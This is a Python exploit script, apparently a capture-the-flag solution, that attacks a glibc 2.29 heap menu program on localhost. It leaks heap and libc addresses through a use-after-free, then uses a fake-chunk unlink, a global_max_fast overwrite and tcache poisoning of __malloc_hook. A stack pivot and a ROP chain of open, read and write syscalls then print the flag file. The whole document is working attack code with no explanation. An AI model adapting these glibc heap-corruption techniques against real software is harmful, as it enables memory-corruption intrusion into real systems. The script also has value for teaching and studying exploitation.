from ptrlib import *

def add(index, name):
    assert len(name) > 0x7f
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendafter(": ", name)
    return

def rename(index, name):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendafter(": ", name)
    return

def show(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    sock.recvuntil(": ")
    return sock.recvline()

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))
    return

def punch(data):
    # need to free chunk of size:0x210 for 6 times
    sock.sendlineafter("> ", "50056")
    sock.send(data)
    return

libc = ELF("./libc-2.29.so")
sock = Socket("localhost", 9999)
libc_main_arena = 0x1e9c40
libc_global_max_fast = 0x1ec600
fd = 6

# leak heap
add(0, '0' * 0x217)
add(1, '1' * 0x217)
delete(0)
delete(1)
heap_base = u64(show(1)) - 0x260
logger.info("heap = " + hex(heap_base))

# evict tcache
for i in range(5):
    add(0, '0' * 0x217)
    delete(0)

# leak libc
add(0, '0' * 0x217)
add(1, '3' * 0x217)
delete(0)
libc_base = u64(show(0)) - libc_main_arena - 0x60
logger.info("libc = " + hex(libc_base))
delete(1)

punch("consume")
add(0, 'X' * 0x217)
delete(0)
rename(0, p64(0) * 2)
delete(0)

for i in range(3):
    add(i, 'Y' * 0x217)
for i in range(3):
    delete(i) # top

fake_chunk  = p64(0) + p64(0x211)
fake_chunk += p64(heap_base + 0x150 - 0x18)
fake_chunk += p64(heap_base + 0x150 - 0x10)
fake_chunk += b'\x00' * (0x210 - len(fake_chunk))
fake_chunk += p64(0x210) + p64(0x600)
add(0, 'A' * 0x400)
rename(0, fake_chunk)
add(2, 'A' * 0x400)
delete(1) # unlink
punch(p64(0x28))

# fill tcache
add(0, '7' * 0x217)
delete(0)

for i in range(6):
    add(0, '0' * 0x1f0)
    delete(0)

add(1, '1' * 0x217)
add(0, '0' * 0x1f0)
delete(0)
rename(0, p64(0)*2)

delete(0)
delete(1)

add(0, '0' * 0x220)
add(0, '0' * 0x1f0)
add(1, '1' * 0x200)
delete(0)
add(1, '5' * 0x200)

rename(0, p64(libc_base + libc_main_arena + 0x250) + p64(heap_base + 0x130))
delete(1)
rename(1, p64(0)*2 + p64(heap_base + 0x130))

payload  = b'A' * 0x10
payload += p64(libc_base + libc.symbol('__malloc_hook'))
payload += b'\x00' * (0x1f0 - len(payload))
add(0, 'C' * 0x1f0)
add(0, payload) # overwrite tcache
punch(p64(libc_base + 0x0008f41a) + b'flag\x00') # add rsp, 0x48; ret;

rop_pop_rdi = libc_base + 0x00026876
rop_pop_rsi = libc_base + 0x000272ce
rop_pop_rdx = libc_base + 0x001300e6
rop_pop_rcx_rbx = libc_base + 0x00104c6e
# open(___malloc_hook + 8, 0)
payload  = p64(rop_pop_rdi)
payload += p64(2)
payload += p64(rop_pop_rsi)
payload += p64(libc_base + libc.symbol('__malloc_hook') + 8)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(libc_base + libc.symbol('syscall'))
# read(fd, heap_base + 0x2000, 0x100)
payload += p64(rop_pop_rdi)
payload += p64(fd)
payload += p64(rop_pop_rsi)
payload += p64(heap_base + 0x2000)
payload += p64(rop_pop_rdx)
payload += p64(0x100)
payload += p64(libc_base + libc.symbol('read'))
# puts(heap_base + 0x2000)
payload += p64(rop_pop_rdx)
payload += p64(0x100)
payload += p64(rop_pop_rsi)
payload += p64(heap_base + 0x2000)
payload += p64(rop_pop_rdi)
payload += p64(1)
payload += p64(libc_base + libc.symbol('write'))

# get the flag!
add(0, payload)

sock.interactive()
